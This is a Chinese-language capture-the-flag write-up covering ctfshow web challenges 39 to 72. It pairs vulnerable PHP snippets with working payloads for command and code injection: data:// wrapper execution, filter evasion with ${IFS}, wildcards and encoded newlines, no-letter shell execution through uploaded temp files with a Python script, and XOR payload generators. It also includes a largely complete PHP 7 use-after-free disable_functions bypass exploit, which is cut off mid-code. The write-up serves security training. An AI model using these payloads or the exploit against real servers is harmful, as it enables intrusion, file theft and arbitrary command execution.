//注释符 绕过1&lt;?php //flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c.&quot;.php&quot;); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=data://text/plain,&lt;?php system(&#x27;ls&#x27;);// #flag.php index.php ?c=data://text/plain,&lt;?php system(&#x27;tac f*&#x27;);//或者是?c=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt; #flag.php index.php .php?c=data://text/plain,&lt;?php system(&#x27;tac f*&#x27;);?&gt; 1.12 Web 40 — 无参函数构造（套娃）1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=print_r(scandir(current(localeconv()))); #Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php ) ?c=highlight_file(next(array_reverse(scandir(current(localeconv())))));#读取数组倒数第二个元素，并使用高亮显示出来 1.13 Web 41 —过滤不严，命令执行 1&lt;?php if(isset($_POST[&#x27;c&#x27;]))&#123; $c = $_POST[&#x27;c&#x27;];if(!preg_match(&#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;, $c))&#123; eval(&quot;echo($c);&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; https://wp.ctf.show/d/137-ctfshow-web-web41 1.14 Web 42 — system &gt;/dev/null 2&gt;&amp;1 — %0a 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls%0a #flag.php index.php ?c=tac flag.php%0a 1.15 Web 43 — system &gt;/dev/null 2&gt;&amp;1 — %26 绕过1&lt;?php 1?c=ls%26 #flag.php index.php ?c=tac flag.php%26 1.16 Web 44 — 过滤 flag — * 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls%0a?c=tac f*%0a 1.17 Web 45 — 过滤 空格 — || ${IFS} 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| /i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09f*||?c=tac$&#123;IFS&#125;f*||?c=tac$IFS$1f*|| 1.18 Web 46 — 过滤 * — ? 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09fl?g.php|| 1.19 Web 47 — 过滤 * — ? 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09f?ag.php 1.20 Web 48 — 过滤 * — ? 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09f?ag.php 1.21 Web 49 — 过滤 * — ? 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09f?ag.php 1.22 Web 50 — 过滤 通配符 — \\ &gt; &lt; 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=nl&lt;fl\\ag.php||?c=nl&gt;fl\\ag.php||?c=nl&lt;&gt;fl\\ag.php||?c=vi&lt;fl\\ag.php||#该题使用通配符不可行 1.23 Web 51 — 过滤 空格、通配符、$ — \\ &gt; &lt; 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=nl&lt;fl\\ag.php|| 1.24 Web 52 — 过滤 空格、通配符、&gt; &lt; — \\ $ 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1#禁止了&lt; &gt;,又释放了 $?c=ls|| #flag.php index.php ?c=nl$&#123;IFS&#125;fl\\ag.php|| #flag_here，错误的flag?c=ls$&#123;IFS&#125;/|| #bin dev etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var ?c=nl$&#123;IFS&#125;/fl\\ag|| 1.25 Web 53 — system() — nl \\ ${IFS} 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; echo($c); $d = system($c); echo &quot;&lt;br&gt;&quot;.$d; &#125;else&#123; echo &#x27;no&#x27;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls #lsflag.php index.php readflag readflag?c=nl$&#123;IFS&#125;fla\\g.php 1.26 Web 54 — system() — vi ${IFS} ? 绕过1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls #flag.php index.php ?c=vi$&#123;IFS&#125;f???.????c=vi$&#123;IFS&#125;????.??? 1.27 Web 55 — 过滤 字母 [a-z] — /bin/ + ? 绕过1&lt;?php // 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; bin 为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是 /bin/ls测试： 1touch flag.phpecho 123 &gt; flag.phpbase64 flag.php/bin/base64 flag.php 1# 利用 /bin/目录?c=/???/????64 ????.???# ?c=/bin/base64 flag.php 1# 利用 /usr/bin/目录# 我们可以利用/usr/bin下的**bzip2**,即也就是/usr/bin/bzip2 flag.php# 意思就是说我们先将flag.php文件进行压缩，然后再将其下载?c=/???/???/????2 ????.???# ?c=/usr/bin/bzip2 flag.php# 把flag.php压缩，访问 url + flag.php.bz2 就可以把压缩后的flag.php给下载下来 1.28 Web 56 — 过滤 [a-z] [0-9] — POST 包绕过（利用 . ?）1&lt;?php// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\&#123;|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; POST 上传包 1发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。将命令写入文件后，可以利用点. 来执行文件中的命令，例如. file。也可以source file，但是这题过滤了字母，因此只能用点。如何正确匹配到我们上传的文件呢？探索过程见p神的文章，最后的利用是/???/????????[@-[] 文件上传的前端 1&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;1&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;2&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# 抓包 修改文件内容为 命令 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html Python 脚本 1import requestsurl = &#x27;http://57601c3a-595e-4ea4-a88c-61daa047e7b0.challenge.ctf.show:8080/&#x27;url += &#x27;?c=. /???/????????[@-[]&#x27;#构造urlwhile True: r = requests.post(url,files=&#123;&#x27;file&#x27;:(&quot;dota.txt&quot;,&quot;cat flag.php&quot;)&#125;)#以post进行发包 flag = r.text.split(&quot;ctfshow&quot;)#split() 通过指定分隔符对字符串进行切片，如果参数 num 有指定值，则分隔 num+1 个子字符串 if len(flag)&gt;1:#说明flag获得值了！ print(r.text)#打印flag break#跳出循环 1.29 Web 57 — 过滤 [a-z] [0-9] . ? — 异或 $(())1&lt;?php// 还能炫的动吗？//flag in 36.phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\x0a|\\&gt;|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i&quot;, $c))&#123; system(&quot;cat &quot;.$c.&quot;.php&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1# . ? 均被过滤 无字母、数字终极绕过 — 异或 双小括号 (( )) 是 Bash Shell 中专门用来进行 整数运算 的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。通俗地讲，就是将数学运算表达式放在((和))之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。 可以 使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。 可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。 1root@kali:~/桌面/脚本# echo $(())0root@kali:~/桌面/脚本# echo $((~$(())))-1root@kali:~/桌面/脚本# echo $(( $((~$(()))) $((~$(()))) ))-2root@kali:~/桌面/脚本# echo $(( $((~$(()))) + $((~$(()))) ))-2# 想办法构造 36# 关于取反，经验就是如果b=~a，那么a+b=-1# payload?c=$((~$(( $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))) )))) 1# 异或脚本 $(())# -*- coding: utf-8 -*-import redef write(): #preg = &#x27;[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;]+&#x27; preg = &quot;/[!@#%^&amp;*:&#x27;\\&quot;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/&quot; str = &quot;&quot; for i in range(1, 256): for j in range(1, 256): if not (re.search(preg, chr(i), re.I) or re.search(preg, chr(j), re.I)): k = i ^ j if k &gt;= 32 and k &lt;= 126: a = &#x27;%&#x27; + hex(i)[2:].zfill(2) b = &#x27;%&#x27; + hex(j)[2:].zfill(2) str = (str + chr(k) + &quot; &quot; + a + &quot; &quot; + b + &quot;\\n&quot;) fp = open(&#x27;result.txt&#x27;, &#x27;w&#x27;) fp.write(str)def produce(string): str1 = &quot;&quot; str2 = &quot;&quot; for i in string: fp = open(&#x27;result.txt&#x27;, &#x27;r&#x27;) while True: line = fp.readline() if line == &quot;&quot;: break if line[0] == i: str1 = str1 + line[2:5] str2 = str2 + line[6:9] break fp.close() result = &quot;(\\&quot;&quot; + str1 + &quot;\\&quot;^\\&quot;&quot; + str2 + &quot;\\&quot;)&quot; return resultif __name__ == &quot;__main__&quot;: write() while True: function = input(&quot;输出执行函数:&quot;) parms = input(&quot;请输出函数参数:&quot;) payload = produce(function) + produce(parms) print(payload) 1.30 Web 58 — disable_functions open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开 disable_functions：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空 命令执行，突破禁用函数 1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1# 使用最常见的 c=system(&#x27;ls&#x27;);# 得到Warning: system() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1# 函数被禁用 1# 首先尝试不使用 命令执行的函数 # 套娃 函数套用c=print_r(scandir(current(localeconv())));c=print_r(scandir(dirname(&#x27;__FILE__&#x27;)));# Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php )c=highlight_file(next(array_reverse(scandir(current(localeconv())))));c=highlight_file(&#x27;flag.php&#x27;);c=show_source(&#x27;flag.php&#x27;); 1# 绕disable_functions# 利用 读文件 的函数file_get_contents()highlight_file()show_source()fgets()file()var_dump()readfile()# 利用c=echo file_get_contents(&#x27;flag.php&#x27;);c=highlight_file(&#x27;flag.php&#x27;);c=show_source(&#x27;flag.php&#x27;);c=readfile(&#x27;flag.php&#x27;);c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while($b=fgets($a))&#123;echo $b;&#125;c=$handle=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;c=$handle=fopen(&#x27;flag.php&#x27;,&#x27;r&#x27;);echo fread($handle,1000); 1# 复制 重命名copy(&quot;flag.php&quot;,&quot;flag.txt&quot;); rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);# 即c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);# 后访问 URL/flag.txt 即可 1.31 Web 59 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 禁用了一些函数，不过仍可绕过 1c=show_source(&#x27;flag.php&#x27;);c=highlight_file(&#x27;flag.php&#x27;); 1.32 Web 60 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.33 Web 61 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.34 Web 62 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.35 Web 63 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.36 Web 64 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.37 Web 65 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.38 Web 66 — disable_functions1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 尝试之前的读取文件的函数以及写入文件、重命名等等都被禁用 但是 highlight_file() 能够使用 显然换了位置 1c=print_r(scandir(&#x27;/&#x27;)); #查文件# Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var )c=highlight_file(&#x27;/flag.txt&#x27;); 1.39 Web 67 — disable_functions — var_dump(scandir(‘/‘));1&lt;?php// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=highlight_file(&#x27;flag.php&#x27;);# print_r() 被过滤 var_dump() 代替c=var_dump(scandir(&#x27;/&#x27;));c=highlight_file(&#x27;/flag.txt&#x27;); 1.40 Web 68 — disable_functions — include(“/flag.txt”);直接显示 highlight_file() 被禁用 文件包含 include 1c=var_dump(scandir(&#x27;/&#x27;));# highlight_file() 被禁用 利用文件包含c=include(&quot;/flag.txt&quot;);# include函数会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。文件内容有代码则执行代码，否则直接输出。 1.41 Web 69 — disable_functions — var_export(scandir(‘/‘));1c=var_export(scandir(&#x27;/&#x27;));c=include(&quot;/flag.txt&quot;); 1.42 Web 701c=var_export(scandir(&#x27;/&#x27;));c=include(&quot;/flag.txt&quot;); 1.43 Web 71 — disable_functions — exit();1&lt;?phperror_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;你要上天吗？ 将所有的 字母、数字换成了 ? 强制退出 1c=highlight_file(&#x27;flag.php&#x27;);exit(); #禁用c=var_export(scandir(&#x27;/&#x27;));exit();c=include(&#x27;/flag.txt&#x27;);die(); 列目录新姿势1print_r(glob(&quot;*&quot;)); // 列当前目录print_r(glob(&quot;/*&quot;)); // 列根目录print_r(scandir(&quot;.&quot;));print_r(scandir(&quot;/&quot;));$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\\n&quot;;&#125;$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\\n&quot;;&#125;$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot; &quot;;&#125;$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125; 1c=$a=scandir(&quot;/&quot;);foreach($a as $value)&#123;echo $value.&quot; &quot;;&#125; 1c=$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot; &quot;;&#125; 1c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit(); 1$dir = new DirectoryIterator(dirname(__FILE__));foreach ($dir as $file)&#123; if($file-&gt;isFile())&#123; echo $file-&gt;getFilename().&quot;&lt;br /&gt;&quot;; &#125;&#125;exit(0);c=$dir = new DirectoryIterator(dirname(__FILE__));foreach($dir as $file)&#123;print($file-&gt;getFilename());&#125;;exit(0);c=$dir = new DirectoryIterator(&quot;glob:///*&quot;);foreach($dir as $file)&#123;echo $file-&gt;getFilename().&quot;&lt;br&gt;&quot;;&#125;;exit(0); ob_get_contents函数获得缓冲区的内容，即在此为代码执行的输出结果 在任何时候使用echo，输出都将被加入缓冲区中，直到程序运行结束或者使用ob_flush()来结束。然后在服务器中缓冲区的内容才会发送到浏览器，由浏览器来解析显示。 ob_end_clean函数清除缓冲区的内容。 此时得用一个函数ob_get_contents()在ob_end_clean()前面来获得缓冲区的内容。这样的话，能将在执行ob_end_clean()前把内容保存到一个变量中，然后在ob_end_clean()函数执行后对这个变量做操作。 exit() 函数输出一条消息，并退出当前脚本。 那么在执行完代码之后结束脚本的运行就可以了 1.44 Web 72 — disable_functions — php7-backtrace-bypass 脚本1&lt;?phperror_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;你要上天吗？ php7-backtrace-bypass 脚本 1c=function ctfshow($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace = (new Exception)-&gt;getTrace(); if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; $backtrace = debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p = 0, $s = 8) &#123; $address = 0; for($j = $s-1; $j &gt;= 0; $j--) &#123; $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m = 8) &#123; $out = &quot;&quot;; for ($i=0; $i &lt; $m; $i++) &#123; $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff)); $ptr &gt;&gt;= 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n = 8) &#123; $i = 0; for($i = 0; $i &lt; $n; $i++) &#123; $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff)); $v &gt;&gt;= 8; &#125; &#125; function leak($addr, $p = 0, $s = 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-&gt;a); if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) &#123; $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; $text_size = $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) &#123; $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); if($deref != 0x746e6174736e6f63) continue; &#125; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); if($deref != 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) &#123; $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) &#123; return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr = $basic_funcs; do &#123; $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) &#123; return leak($addr + 8); &#125; $addr += 0x20; &#125; while($f_entry != 0); return false; &#125; function trigger_uaf($arg) &#123; $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;); $vuln = new Vuln(); $vuln-&gt;a = $arg; &#125; if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123; die(&#x27;This PoC is for *nix systems only.&#x27;); &#125; $n_alloc = 10; $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;); trigger_uaf(&#x27;x&#x27;); $abc = $backtrace[1][&#x27;args&#x27;][0]; $helper = new Helper; $helper-&gt;b = function ($x) &#123; &#125;; if(strlen($abc) == 79 || strlen($abc) == 0) &#123; die(&quot;UAF failed&quot;); &#125; $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; write($abc, 0x60, 2); write($abc, 0x70, 6); write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#x27;t determine binary base address&quot;); &#125; if(!($elf = parse_elf($base))) &#123; die(&quot;Couldn&#x27;t parse ELF header&quot;); &#125; if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#x27;t get basic_functions address&quot;); &#125; if(!($zif_system = get_system($basic_funcs))) &#123; die(&quot;Couldn&#x27;t get zif_system address&quot;); &#125; $fake_obj_offset = 0xd0; for($i = 0; $i &lt; 0x110; $i += 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, 